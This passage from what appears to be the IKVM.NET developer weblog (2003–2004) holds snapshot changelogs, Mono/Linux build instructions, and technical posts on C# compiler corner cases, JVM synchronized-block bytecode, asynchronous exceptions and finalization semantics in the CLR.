<LI>Regenerated (and checked in) mscorlib.jar, System.jar and System.Xml.jar with the new (fixed) version of netexp.</LI></UL>
<P>I didn't get around yet to removing the "virtual helpers" and introducing base classes for non-final remapped types (java.lang.Object and java.lang.Throwable).</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip">just the binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source plus binaries</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/16/2004 16:33:14 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f7f1383b-ffc3-4957-b793-3ff71e590587"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f7f1383b-ffc3-4957-b793-3ff71e590587">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 11 January 2004</h2></div>
<div class="newsItems"><a name="ac34f0260-6747-4e8a-9d60-bac641621228"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		I made a new snapshot. Here's what's new:
<UL>
<LI>Renamed Type property of TypeWrapper to TypeAsTBD. This is to make clear that eventually all references to TypeAsTBD should be removed (a more specific TypeAsXXX should be used).</LI>
<LI>Changed several InvalidOperationException tests to assertions.</LI>
<LI>Changed JavaAssemblyAttribute to JavaModuleAttribute. In the future this attribute will go away and be replaced by an attribute that is attached to each type. This is to support linking Java and non-Java types into the same (single file) assembly with the Whidbey linker.</LI>
<LI>Removed getTypeFromWrapper, getWrapperFromType, getType and getName from VMClass and added getWrapperFromClass.</LI>
<LI>Added TypeWrapper.RunClassInit.</LI>
<LI>Fixed serialization and reflection to be able to call constructor on already allocated objects.</LI>
<LI>Added class accessibility checks in various places.</LI>
<LI>Added EmitCheckCast and EmitInstanceOf to TypeWrapper.</LI>
<LI>Changed all .NET type names in map.xml to partially qualified names.</LI>
<LI>Added -target:module support to ikvmc.</LI>
<LI>Added assembly signing support to ikvmc.</LI>
<LI>Added option to set assembly version to ikvmc.</LI>
<LI>Fixed bug in ikvmc that caused crash if jar contained a manifest.</LI>
<LI>Inner class support for native methods that are mapped to NativeCode.* classes.</LI>
<LI>Miscellaneous clean up and restructuring.</LI></UL>
<P>Most of this is clean up and restructuring to facilitate the next major change, removing the "virtual helpers" and introducing base classes for non-final remapped types (java.lang.Object and java.lang.Throwable).</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip">just the binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source plus binaries</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/11/2004 14:23:27 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c34f0260-6747-4e8a-9d60-bac641621228"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c34f0260-6747-4e8a-9d60-bac641621228">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 27 December 2003</h2></div>
<div class="newsItems"><a name="af8c84142-3479-4b25-8b88-4336afd2ed9b"></a><div class="entry">
	<h3 class="entryTitle">dasBlog</h3>
	<div class="entryBody">
		<P>I switched from <A href="http://www.simplegeek.com/">blogX</A> to <A href="http://www.dasblog.net/">dasBlog</A>. Mainly because Chris is no longer maintaining blogX, but also because I wanted some new functionality.</P>
<P>Hopefully the transition will be smooth, but if something is not working please let me know.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/27/2003 19:24:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f8c84142-3479-4b25-8b88-4336afd2ed9b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f8c84142-3479-4b25-8b88-4336afd2ed9b">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a38a44f78-8aa4-4456-a78b-ed061d8c0b46"></a><div class="entry">
	<h3 class="entryTitle">C# Shortcoming?</h3>
	<div class="entryBody">
		<A href="http://www.winterdom.com/weblog/archives/000347.html">Tomas Restrepo</A> posted some weird C# code on his weblog. It inspired me to test a few more corner cases: 
<P></P><PRE>namespace System {
   class Object { }<BR>
   class ValueType { }<BR>
<BR><BR>   struct Int32 { }<BR>
   class String { }<BR>
   class A : string {
      public static void Main() {
         string s = new A();
      }
   }
}
</PRE>
<P>If you compile this and then run peverify on the resulting executable, it will complain about every single type. Here is what's going on: </P>
<UL>
<LI>Object doesn't have a base class 
<LI>ValueType extends our Object not the one in mscorlib 
<LI>Int32 extends our ValueType 
<LI>String extends our Object 
<LI>A extends our String, but the local variable s is of type [mscorlib]System.String, so the assignment is not legal. </LI></UL>
<P>An obvious explanation for this (broken) behavior of the C# compiler is that Microsoft use the C# compiler to build mscorlib.dll. When compiling mscorlib.dll, the above behavior makes perfect sense. Of course, when you're not compiling mscorlib.dll, it doesn't make much sense and, in fact, it violates the language specification. For example, section 4.2.3 says: </P>
<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The keyword <CODE class=ce>string</CODE> is simply an alias for the predefined class <CODE class=ce>System.String</CODE>. </P>
<P>"predefined" being the important word here. </P>
<P>I guess it would be relatively easy to fix the compiler, but I think that there is actually an underlying problem: The C# language doesn't have support for assembly identities. Besides the above corner cases, this also causes <A href="http://staff.develop.com/candera/weblog2/articleview.aspx/CLR%20Workings/Hideous%20CS%20Version%20Problem.xml">problems in more real world situations</A>. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/27/2003 13:06:10 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=38a44f78-8aa4-4456-a78b-ed061d8c0b46"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=38a44f78-8aa4-4456-a78b-ed061d8c0b46">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 24 December 2003</h2></div>
<div class="newsItems"><a name="ab18d3c8e-a193-4249-90bd-2f2485299353"></a><div class="entry">
	<h3 class="entryTitle">Oops!</h3>
	<div class="entryBody">
		<P>Last week's snapshot had a nasty bug. The code to copy the stack contents out of an exception block reversed the stack order. Not a good thing. A pretty stupid bug, but in my defense, this problem didn't show up with my Mauve tests compiled with Jikes. It only showed up on Eclipse (which I didn't have installed at the time). Thanks to Zoltan Varga for bringing this bug to my attention. </P>
<P>I've updated the snapshots. I also made some additional changes: </P>
<UL>
<LI>ikvmc now sniffs the name of the main class from the Jar manifest, if it exists. 
<LI>Made loading of core Java classes used by the runtime more consistent. Introduced a new method ClassLoaderWrapper.LoadClassCritical and removed ClassLoaderWrapper.GetType (which had a similar but less well defined role). 
<LI>Fixed some bugs related to -Xsave. 
<LI>Introduced TypeWrapper.MakeArrayType to construct array types. 
<LI>Added CodeEmitter.InternalError for emitters that should never be called (it throws an InvalidOperationException when its Emit method is called). 
<LI>Cleaned up the warning message that shows up in netexp (and now also in ikvmc) that tells you that type initializers are being run when they shouldn't (due to a .NET runtime bug). The warning now only shows up if your .NET runtime has the bug. 
<LI>Removed ThrowHack and changed the compiler to now always emit verifiably code when injecting exception throwing code (e.g. for illegal access errors). 
<LI>Cleaned up JavaException.cs. 
<LI>Changed MethodWrapper.GetExceptions to return string array and resolve these to classes on the Java side. 
<LI>Fixed various bugs related to unloadable classes. The code generated to start up Eclipse is now totally verifiable (except for the JNI calls, of course). 
<LI>Fixed reflection code to report assembly scoped methods and fields to be private when reporting on .NET assembly that was not generated by IKVM.NET. 
<LI>Fixed TypeWrapper.IsInSamePackage to handle array types correctly. 
<LI>Added a JVM.CriticalFailure method that is called when something is really wrong in the runtime (e.g. LoadClassCritical failed or an unexpected exception occurred in the bytecode compiler). 
<LI>Added a JniProxyBuilder (for development and testing only) that splits out the JNI methods into a separate module, so that the peverify errors that are produced can be easily filtered out. 
<LI>Reimplemented class accessibility checks in bytecode compiler (they've been broken for a long time, since I started adding support for unloadable classes). </LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip">just the binaries</A>, <A href="http://www.frijters.net/ikvm.zip">source plus binaries</A> and <A href="http://www.frijters.net/classpath.zip">GNU Classpath</A>. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/24/2003 12:53:05 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b18d3c8e-a193-4249-90bd-2f2485299353"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b18d3c8e-a193-4249-90bd-2f2485299353">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 19 December 2003</h2></div>
<div class="newsItems"><a name="ad98e0bf8-b252-4c13-9e25-b72a55068fd2"></a><div class="entry">
	<h3 class="entryTitle">Building IKVM.NET on Mono/Linux</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I installed Debian 3.0r1 in VMware to work on getting IKVM.NET to build on Mono.
    </p>
    <p>
        I put together a new snapshot, this time including a GNU Classpath snapshot, because
        of the <a href="http://savannah.gnu.org/statement-original.html">compromise</a> of
        the FSF CVS server my Classpath sources differ from what's available in CVS.
    </p>
    <p>
        Here are the steps required to build IKVM.NET on Mono on Debian:
    </p>
    <ul>
        <li>
            Download and extract Mono 0.29 <a href="http://www.go-mono.com/archive/mono-0.29.tar.gz">runtime</a> and <a href="http://www.go-mono.com/archive/mcs-0.29.tar.gz">C#
            compiler</a> 
        </li>
        <li>
            Comment out the line<br />
            <code>[assembly: AssemblyKeyFile("..\\..\\bytefx.snk")]</code>
            <br />
            in mcs-0.29/class/ByteFX.Data/AssemblyInfo.cs. 
        </li>
        <li>
            Make the <code>HasShutdownStarted</code> property in mcs-0.29/class/corlib/System/Environment.cs
            static and change it to return false instead of throw a NotImplementedException. 
        </li>
        <li>
            <code>cd mono-0.29</code> 
        </li>
        <li>
            <code>./configure &amp;&amp; make &amp;&amp; make install</code> 
        </li>
        <li>
            <code>cd ../mcs-0.29</code> 
        </li>
        <li>
            <code>make &amp;&amp; make install</code> 
        </li>
        <li>
            Download and extract <a href="ftp://www-126.ibm.com/pub/jikes/1.18/jikes-1.18.tar.bz2">Jikes
            1.18</a> 
        </li>
        <li>
            <code>cd jikes-1.18</code> 
        </li>
        <li>
            <code>./configure &amp;&amp; make &amp;&amp; make install</code> 
        </li>
        <li>
            Download <a href="http://prdownloads.sourceforge.net/nant/nant-0.84.zip?download">NAnt
            0.84-rc1</a> 
        </li>
        <li>
            <code>mkdir nant-0.84</code> 
        </li>
        <li>
            <code>cd nant-0.84</code> 
        </li>
        <li>
            <code>unzip ../nant-0.84.zip</code> 
        </li>
        <li>
            Comment out the class constructor (<code>static CompilerBase() { ... }</code>) in
            src/NAnt.DotNet/Tasks/CompilerBase.cs. 
        </li>
        <li>
            <code>make clean &amp;&amp; make</code> 
        </li>
        <li>
            Create a <code>nant</code> shell script in /usr/local/bin that contains:<br />
            <code>#!/bin/sh<br />
            /usr/local/bin/mono /usr/local/src/nant-0.84/bin/NAnt.exe "$@"</code> 
        </li>
        <li>
            Create a dummy <code>peverify</code> shell script, that contains:<br />
            <code>#!/bin/sh</code> 
        </li>
        <li>
            Download and unzip <a href="http://www.frijters.net/classpath.zip">classpath.zip</a> (don't
            run any of the scripts) 
        </li>
        <li>
            Download and unzip <a href="http://www.frijters.net/ikvm.zip">ikvm.zip</a> 
        </li>
        <li>
            <code>cd ikvm</code> 
        </li>
        <li>
            <code>nant clean</code> 
        </li>
        <li>
            <code>nant</code> 
        </li>
    </ul>
    <p>
        Note: I have not yet integrated Zoltan Varga's <a href="http://www.nexus.hu/vargaz/">JNI
        provider for Mono</a> and the (broken) Windows Forms based AWT is not built on Mono.
    </p>
    <p>
        Here is what's new since the last snapshot:
    </p>
    <ul>
        <li>
            Changed build process to work on Mono/Linux. 
        </li>
        <li>
            Added flag to bytecode metadata table to see if an instruction can throw an exception.
            The compiler can use this optimize away useless exception blocks. 
        </li>
        <li>
            Changed constant pool constant handling to stop boxing the values and use type based
            accessors instead. 
        </li>
        <li>
            Fixed handling of ConstantValue attribute (now works for static fields regardless
            of whether they are final are not). 
        </li>
        <li>
            Exception remapping is now defined in map.xml. This allows more efficient exception
            handlers, because the compiler now understand the exception hierarchy (including the
            constraints imposed by the remapping). 
        </li>
        <li>
            Changed handling of netexp exported classes to be more robust in the face of errors
            (on Mono some of the mscorlib.jar classes are not (yet) present in mscorlib.dll). 
        </li>
        <li>
            Fixed emitting of DebuggableAttribute (the attribute was attached to the module, but
            it should be attached to the assembly). 
        </li>
        <li>
            Moved most of ExceptionHelper.cs to ExceptionHelper.java and changed the runtime to
            generate the exception mapping method from map.xml. 
        </li>
        <li>
            Fixed some ghost related bugs. 
        </li>
        <li>
            Added a test to supress the type initializer bug warning (during netexp) on runtimes
            that are not broken. 
        </li>
        <li>
            Moved common conversion emit operations to TypeWrapper (EmitConvStackToParameterType
            &amp; EmitConvParameterToStackType). 
        </li>
        <li>
            Added test in JavaTypeImpl.Finish to make sure that we are not in "phase 1" of static
            compilation. During phase 1, classes are being loaded and no compilation should occur,
            if it does get triggered it is because of a bug in the compiler or a compilation error
            during compilation of the bootstrap classes. 
        </li>
        <li>
            Changed loading of java.lang.Throwable$VirtualMethods so that the ClassNotFound warning
            doesn't occur any more. 
        </li>
        <li>
            Added (partial) support for private interface method implementations to reflection.
            This fixes a bug in netexp, that caused classes that use private interface implementation
            to be unusable from Java (because they appear abstract, because of the missing method). 
        </li>
        <li>
            Removed WeakHashtable.cs. Exception mapping code is now written in Java and uses java.util.WeakHashMap. 
        </li>
        <li>
            Removed StackTraceElement class from classpath.cs. Exception mapping code is now written
            in Java and uses the GNU Classpath StackTraceElement.java. 
        </li>
        <li>
            Moved java.lang.Runtime native methods to Java (except for getVersion and nativeLoad).
            This is based on a new split of java.lang.Runtime and java.lang.VMRuntime that hasn't
            been checked into Classpath yet. 
        </li>
        <li>
            Many changes to the bytecode compiler to emit more efficient (actually less inefficient)
            code for exception handlers. 
        </li>
        <li>
            Added workaround to bytecode compiler to Improve debugging line number information. 
        </li>
        <li>
            Various bug fixes and some clean up of bytecode compiler. 
        </li>
        <li>
            Made ikvmc more user-friendly. It now guesses all options based on the input. You
            can now do "ikvmc HelloWorld.class" and it will generate HelloWorld.exe (if HelloWorld.class
            has a main method, if not it will generate HelloWorld.dll). 
        </li>
        <li>
            Fixed DotNetProcess (that implement Runtime.exec) to handle environment variable duplicates
            properly. 
        </li>
        <li>
            Removed support for throwing arbitrary exceptions using Thread.stop(Throwable). You
            can now only throw arbitrary exceptions on the current thread or ThreadDeath exceptions
            on other threads. 
        </li>
        <li>
            Implemented shutdown hooks. 
        </li>
        <li>
            Changed ikvm.exe to use a more compatible way of finding the main method and to always
            run the static initializer of the main class (even if the main method is missing). 
        </li>
        <li>
            The ikvm -Xsave option is now implemented using a shutdown hook. This allows it to
            work even if the application terminates with System.exit(). 
        </li>
    </ul>
    <p>
        New snapshots: <a href="http://www.frijters.net/ikvmbin.zip">just the binaries</a>, <a href="http://www.frijters.net/ikvm.zip">source
        plus binaries</a> and <a href="http://www.frijters.net/classpath.zip">GNU Classpath</a>.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/19/2003 14:56:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d98e0bf8-b252-4c13-9e25-b72a55068fd2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d98e0bf8-b252-4c13-9e25-b72a55068fd2">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 18 December 2003</h2></div>
<div class="newsItems"><a name="a3af9548e-4905-4557-8809-65a205ce2cd6"></a><div class="entry">
	<h3 class="entryTitle">Asynchronous Exceptions</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I've been working on some low hanging fruit optimizations for the code generator and
        I came across the following peculiar bytecode pattern used by Jikes to compile synchronized
        blocks:
    </p>
    <pre>   0  goto 6
   3  aload_1
   4  monitorexit
   5  athrow
   6  aload_0
   7  dup
   8  astore_1
   9  monitorenter
  10  aload_1
  11  monitorexit
  12  return
Exception table:
   start_pc = 3
   end_pc = 5
   handler_pc = 3
   catch_type = java/lang/Throwable
   start_pc = 10
   end_pc = 12
   handler_pc = 3
   catch_type = java/lang/Throwable</pre>
    <p>
        This code results from this method:
    </p>
    <pre>static void main(String[] args) {
  synchronized(args) {
  }
}
</pre>
    <p>
        I was confused by the first entry in the exception table. It protects part of the
        exception handler and points to itself. Why would you do this?
    </p>
    <p>
        Luckily, Jikes is open source, so I went and looked at the <a href="http://www-124.ibm.com/developerworks/oss/cvs/jikes/~checkout~/jikes/src/bytecode.cpp?rev=1.166&amp;content-type=text/plain">source</a> code
        (see ByteCode::EmitSynchronizedStatement). The comment in the function explains that
        the additional protection of the exception handler is there to deal with <a href="http://java.sun.com/j2se/1.4.2/docs/api/java/lang/Thread.html#stop(java.lang.Throwable)">asynchronous
        exceptions</a>. The Jikes bug database contains a better <a href="http://www-124.ibm.com/developerworks/bugs/?func=detailbug&amp;bug_id=2647&amp;group_id=10">explanation</a> of
        the issue.
    </p>
    <p>
        So, it turns out that this somewhat strange looking construct is actually a perfect
        way to make sure that locks are always released (and only once) even if an asynchronous
        exception occurs. (Note that this assumes that monitorexit is an atomic instruction,
        wrt asynchronous exceptions, this isn't in the JVM specification[1], but it is a reasonable
        assumption.)
    </p>
    <p>
        At the moment, IKVM compiles this code as follows (pseudo code):
    </p>
    <pre>  object local = args;
  object exception = null;
  Monitor.Enter(local);
  try {
    // this is where the body of the synchronized block would be
    Monitor.Exit(local);
  } catch(System.Exception x) {
    exception = x;
    ExceptionHelper.MapExceptionFast(x);
    goto handler;
  }
  return;
handler:
  try {
    Monitor.Exit(local);
  } catch(System.Exception x) {
    exception = x;
    ExceptionHelper.MapExceptionFast(x);
    goto handler;
  }
  throw x;
</pre>
    <p>
        This is obviously pretty inefficient, but more importantly, it is incorrect. If an
        asynchronous exception occurs at the right (or rather, wrong) moment the lock will
        be released twice.
    </p>
    <p>
        The right way to compile this would be (pseudo code again):
    </p>
    <pre>  object local = args;
  Monitor.Enter(local);
  try {
    // this is where the body of the synchronized block would be
  } finally {
    Monitor.Exit(local);
  }</pre>
    <p>
        Of course, in the current version of the CLR, this still wouldn't be safe in the face
        of asynchronous exceptions, but Chris Brumme <a href="http://blogs.gotdotnet.com/cbrumme/PermaLink.aspx/68bb6af0-d15f-44fd-b6a7-41926c415cc4">assures</a> us
        that in future versions it will be.
    </p>
    <p>
        BTW, an alternative way to compile it (which, presumably, would work correctly even
        in today's CLR), is to move the synchronized block into a new method that is marked
        with <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpref/html/frlrfsystemruntimecompilerservicesmethodimploptionsclasstopic.asp/">MethodImplOptions.Synchronized</a>.
    </p>
    <p>
        The tricky part of both of these solutions, is recognizing the code sequences that
        need to be compiled as a try finally clause. Various Java compilers can use different
        patterns (although a pretty firm clue is provided by the two exception blocks that
        must end exactly after the monitorexit instruction).
    </p>
    <p>
        This is one situation where compiling bytecode instead of Java source, makes it a
        lot harder to do the right thing.
    </p>
    <p>
        [1] The JVM specification actually contains an <a href="http://java.sun.com/docs/books/vmspec/2nd-edition/html/Compiling.doc.html#6530">incorrect
        example</a> of how to compile a synchronized block. Not only does this example not
        use the above protection against asynchronous exceptions, it also doesn't protect
        the aload_2 and monitorexit instructions at offset 8 and 9.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/18/2003 11:33:18 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3af9548e-4905-4557-8809-65a205ce2cd6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3af9548e-4905-4557-8809-65a205ce2cd6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 12 December 2003</h2></div>
<div class="newsItems"><a name="a9a5ee106-e493-4b5b-a80d-f52af817c493"></a><div class="entry">
	<h3 class="entryTitle">ThinkPad</h3>
	<div class="entryBody">
		<P>(This entry is totally unrelated to IKVM.NET) </P>
<P>Last week I got my new ThinkPad <A href="http://www-132.ibm.com/webapp/wcs/stores/servlet/ProductDisplay?productId=8672731&amp;storeId=1&amp;langId=-1&amp;categoryId=2049168&amp;dualCurrId=73&amp;catalogId=-840">T41p</A> and it has a cool feature, a built-in <A href="http://www.analog.com/Analog_Root/productPage/productHome/0,2121,ADXL202,00.html">accelerometer</A>. It is used to park the harddisk when the system detects shocks or falls down ("<A onclick="window.open('http://www.pc.ibm.com/presentations/aps/56/index.html', 'popup', 'height=480,innerHeight=480,width=640,innerWidth=640,screenX=0,screenY=0,scrollbars=no,resizable=no');return false;" href="http://www.pc.ibm.com/presentations/aps/56/index.html">IBM Hard Drive Active Protection System</A>"). </P>
<P>I reverse engineered one of the IOCTLs that can be used to read the accelerometer data and built a simple C# application that displays an artificial horizon. It includes a simple reusable class that encapsulates the communication with the device driver (the standard IBM device driver). </P>
<P>Source can be found <A href="http://www.frijters.net/horizon.cs">here</A>. </P>
<P>Not very useful, but fun stuff anyway. In Longhorn this could be used to keep the desktop level :-) </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/12/2003 14:10:43 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9a5ee106-e493-4b5b-a80d-f52af817c493"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9a5ee106-e493-4b5b-a80d-f52af817c493">Comments [13]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 December 2003</h2></div>
<div class="newsItems"><a name="ab199682c-6546-46fd-bead-bc355c4fc21f"></a><div class="entry">
	<h3 class="entryTitle">Finalization and the JIT</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        One of the subtle differences between the JVM bytecode instruction set and the CLR
        instructin set is that the JVM splits object instantiation in two steps: 1) allocation
        and 2) initialization. The CLR combines both steps in a single instruction. 
    </p>
    <p>
        This usually&#160;isn't a big difference. The CLR way makes the verifier a little
        easier because it doesn't need to keep track of uninitialized references. However,
        in the face of finalization, the difference is actually detectable. 
    </p>
    <p>
        Here is a Java example: 
    </p>
    <pre>class foo {
  static int throwException() {
    throw new Error();
  }

  foo(int i) {
  }

  public static void main(String[] args) {
    try {
      new foo(throwException());
    } catch(Error x) {
      System.gc();
      System.runFinalization();
      throw x;
    }
  }

  protected void finalize() {
    System.out.println("finalize");
  }
}</pre>
    <p>
        When this class is run, it prints "finalizable" and a stack trace. Looking at the
        bytecode of the main method, it is obvious why: 
    </p>
    <p>
        &#160;&#160; 0&#160; new foo<br />
        &#160;&#160; 3&#160; invokestatic &lt;Method foo throwException()I&gt;<br />
        &#160;&#160; 6&#160; invokespecial &lt;Method foo &lt;init&gt;(I)V&gt;<br />
        &#160;&#160; 9&#160; goto 21<br />
        &#160; 12&#160; astore_1<br />
        &#160; 13&#160; invokestatic &lt;Method java/lang/System gc()V&gt;<br />
        &#160; 16&#160; invokestatic &lt;Method java/lang/System runFinalization()V&gt;<br />
        &#160; 19&#160; aload_1<br />
        &#160; 20&#160; athrow<br />
        &#160; 21&#160; return 
    </p>
    <p>
        The first instruction is a <em>new </em>that allocates the foo instance. Even if the
        following call to throwException throws an exception, the foo instance already exists
        and will be finalized. 
    </p>
    <p>
        Here is the (approximately) corresponding C# code: 
    </p>
    <pre>class Foo {
  Foo(int i) {
  }

  ~Foo() {
    System.Console.WriteLine("Finalize");
  }

  static int ThrowException() {
    throw new System.Exception();
  }

  static void Main() {
    try {
      new Foo(ThrowException());
    } catch(System.Exception x) {
      System.Console.WriteLine(x);
    }
  }
}</pre>
    <p>
        When this code is run, the output <em>should</em> be just the stack trace, but it
        turns out that it will also print "Finalize" (on .NET, not on Mono). This is a bug
        in the .NET JIT. It moves the object allocation up to be able to more efficiently
        construct the call stack for the constructor invocation, but in doing so it subtly
        changes the semantics. When the above code is compiled with debugging enabled, it
        works as expected.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/01/2003 21:17:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b199682c-6546-46fd-bead-bc355c4fc21f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b199682c-6546-46fd-bead-bc355c4fc21f">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 23 November 2003</h2></div>
<div class="newsItems"><a name="a4d74e2d2-f0b8-4838-912f-9cfb42d970b0"></a><div class="entry">
	<h3 class="entryTitle">More On Finalization</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        After posting my previous entry about C# destructors, I came up with a better implementation
        of them. 
    </p>
    <p>
        What if, instead of depending on the derived class to be well behaved we could enforce
        that the base class destructor is always called? 
    </p>
    <p>
        It turns out that this is possible, thanks to the extremely powerful capabilities
        the CLR has for dealing with methods. 
    </p>
    <p>
        Here is an example C# class: 
    </p>
    <pre>  class Foo {
    ~Foo() {
      // release unmanaged resource
    }
  } </pre>
    <p>
        The current C# compiler compiles this as: 
    </p>
    <pre>  class Foo {
  &#160; protected void Finalize() {
    &#160; try {
        // release unmanaged resource
      }&#160;finally {
        base.Finalize();
      }
    }
  }</pre>
    <p>
        As I pointed out in my previous <a href="http://weblog.ikvm.net/PermaLink.aspx/ec330149-7da0-473a-b693-1c51eb03496a">entry</a>,
        the problem with this construct is that it depends on any derived class to have a
        similar Finalize method (that ensures the base class Finalize gets called). However,
        not all languages have such a feature built-in like C#. For example, in VB.NET it
        is trivial (and an easy mistake to make) to override Finalize and to forget to call
        the base class implementation. 
    </p>
    <p>
        It occurred to me that you could also compile the example class as follows (pseudo
        code): 
    </p>
    <pre>class Foo {
  private void .dtor() overrides Object.Finalize {
    try {
      Finalize();
    } finally {
      // release unmanaged resource
    }
  }
  protected new virtual void Finalize() {
  }
}</pre>
    <p>
        Note that this uses the CLR's ability to override a method even though the method
        name is different and the ability to introduce a new virtual method with the same
        name, but a different vtable slot. 
    </p>
    <p>
        Now, you don't rely on the derived class to have a correct Finalize method, because
        even if the derived class' Finalize method doesn't call the base class method, the
        finally block in .dtor will still run. 
    </p>
    <p>
        For a few minutes I was happy with myself for coming up with this clever trick, but
        I soon realized that while it was a little better, it still did nothing to prevent
        malicious code from calling Thread.Sleep() in their overridden Finalize method. 
    </p>
    <p>
        It turns out that there is an even bigger problem with this solution, though. The <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpgenref/html/cpconfinalizedispose.asp">current
        design guidelines</a> for cleaning up unmanaged resources actually suggest that you
        call a virtual method from your destructor that does the actual cleanup. This, of
        course, reintroduces the problem that the derived class can override that method and
        not call the base class. 
    </p>
    <p>
        In summary, it's a big mess. My original (Java) suggestions for writing a safe class
        that wraps an unmanaged resource are <a href="http://weblog.ikvm.net/PermaLink.aspx/3e0abc11-f486-4366-9127-cf38bb6c3ef1">here</a> and
        they apply to .NET classes in the same way. My suggestions to Microsoft are: 
    </p>
    <ul>
        <li>
